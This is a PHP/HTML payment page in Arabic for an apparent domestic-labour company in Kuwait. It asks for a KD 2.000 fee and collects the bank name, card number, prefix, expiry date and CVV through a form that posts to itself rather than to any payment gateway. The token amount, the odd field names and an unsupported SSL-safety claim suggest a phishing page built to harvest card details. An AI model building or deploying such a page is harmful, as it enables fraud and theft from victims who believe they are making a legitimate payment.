<?php
session_start();
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8">
    <title>صفحة الدفع - الدرة</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        * { font-family: "Cairo", sans-serif; color: #691E7C; }
        body { background: linear-gradient(135deg, #f5f5f5 0%, #edeef4 100%); min-height: 100vh; padding: 20px 0; }
        .payment-container { max-width: 600px; margin: 30px auto; background: white; border-radius: 15px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1); }
        .payment-header { background: linear-gradient(135deg, #691E7C 0%, #8B3A9C 100%); color: white; padding: 30px; text-align: center; }
        .payment-header h2 { margin: 0; font-weight: bold; font-size: 28px; }
        .payment-header p { margin: 10px 0 0 0; color: rgba(255, 255, 255, 0.9); font-size: 14px; }
        .payment-body { padding: 30px; }
        .payment-info { background: #f8f9fa; border-radius: 10px; padding: 20px; margin-bottom: 25px; border-right: 4px solid #691E7C; }
        .payment-info-row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 14px; }
        .payment-info-label { font-weight: bold; color: #691E7C; }
        .payment-info-value { color: #666; }
        .form-group { margin-bottom: 20px; }
        .form-group label { font-weight: bold; margin-bottom: 8px; display: block; color: #691E7C; font-size: 13px; }
        .form-control, .form-select { border: 2px solid #e0e0e0; border-radius: 8px; padding: 10px 12px; font-size: 14px; }
        .card-input-row { display: grid; grid-template-columns: 2fr 1fr; gap: 15px; }
        .expiry-row { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .btn-pay { width: 100%; padding: 12px; background: linear-gradient(135deg, #691E7C 0%, #8B3A9C 100%); color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; }
        .security-info { display: flex; align-items: center; gap: 8px; font-size: 12px; color: #666; margin-top: 15px; padding-top: 15px; border-top: 1px solid #e0e0e0; }
    </style>
</head>
<body>
    <div class="payment-container">
        <div class="payment-header">
            <h2>💳 صفحة الدفع</h2>
            <p>أكمل عملية الدفع بأمان</p>
        </div>
        <div class="payment-body">
            <div class="payment-info">
                <div class="payment-info-row">
                    <span class="payment-info-label">المستفيد:</span>
                    <span class="payment-info-value">شركة الدرة للعمالة المنزلية</span>
                </div>
                <div class="payment-info-row">
                    <span class="payment-info-label">المبلغ:</span>
                    <span class="payment-info-value"><strong>KD 2.000</strong></span>
                </div>
                <div class="payment-info-row">
                    <span class="payment-info-label">الوصف:</span>
                    <span class="payment-info-value">خدمة العمالة المنزلية</span>
                </div>
            </div>
            <form method="POST" action="">
                <div class="form-group">
                    <label for="bank"><i class="fas fa-university"></i> اختر البنك</label>
                    <select name="bank" id="bank" class="form-select" required>
                        <option value="">-- اختر البنك --</option>
                        <option value="ABK">البنك الأهلي الكويتي</option>
                        <option value="RAJHI">مصرف الراجحي</option>
                        <option value="BBK">بنك البحرين والكويت</option>
                        <option value="BOUBYAN">بنك بوبيان</option>
                        <option value="BURGAN">بنك برقان</option>
                        <option value="CBK">البنك التجاري الكويتي</option>
                        <option value="DOHA">بنك الدوحة</option>
                        <option value="GBK">بنك الخليج</option>
                        <option value="TAM">بيتك</option>
                        <option value="KFH">بيت التمويل الكويتي</option>
                        <option value="KIB">بنك الكويت الدولي</option>
                        <option value="NBK">بنك الكويت الوطني</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="cardNumber"><i class="fas fa-credit-card"></i> رقم البطاقة</label>
                    <div class="card-input-row">
                        <input type="text" name="cardNumber" id="cardNumber" class="form-control" placeholder="0000 0000 0000 0000" required maxlength="19">
                        <select name="bad" class="form-select" required>
                            <option value="">البادئة</option>
                            <option value="4">Visa (4)</option>
                            <option value="5">Mastercard (5)</option>
                            <option value="3">Amex (3)</option>
                        </select>
                    </div>
                </div>
                <div class="form-group">
                    <label><i class="fas fa-calendar"></i> تاريخ انتهاء البطاقة</label>
                    <div class="expiry-row">
                        <select name="month" class="form-select" required>
                            <option value="">الشهر</option>
                            <option value="01">01</option>
                            <option value="02">02</option>
                            <option value="03">03</option>
                            <option value="04">04</option>
                            <option value="05">05</option>
                            <option value="06">06</option>
                            <option value="07">07</option>
                            <option value="08">08</option>
                            <option value="09">09</option>
                            <option value="10">10</option>
                            <option value="11">11</option>
                            <option value="12">12</option>
                        </select>
                        <select name="year" class="form-select" required>
                            <option value="">السنة</option>
                            <option value="2026">2026</option>
                            <option value="2027">2027</option>
                            <option value="2028">2028</option>
                            <option value="2029">2029</option>
                            <option value="2030">2030</option>
                            <option value="2031">2031</option>
                            <option value="2032">2032</option>
                            <option value="2033">2033</option>
                            <option value="2034">2034</option>
                            <option value="2035">2035</option>
                        </select>
                    </div>
                </div>
                <div class="form-group">
                    <label for="password"><i class="fas fa-lock"></i> رمز الأمان (CVV)</label>
                    <input type="password" name="password" id="password" class="form-control" placeholder="000" required maxlength="4">
                </div>
                <button type="submit" name="submit" class="btn-pay">
                    <i class="fas fa-lock"></i> تأكيد الدفع - KD 2.000
                </button>
                <div class="security-info">
                    <i class="fas fa-shield-alt"></i>
                    <span>معاملتك محمية بتشفير SSL آمن</span>
                </div>
            </form>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
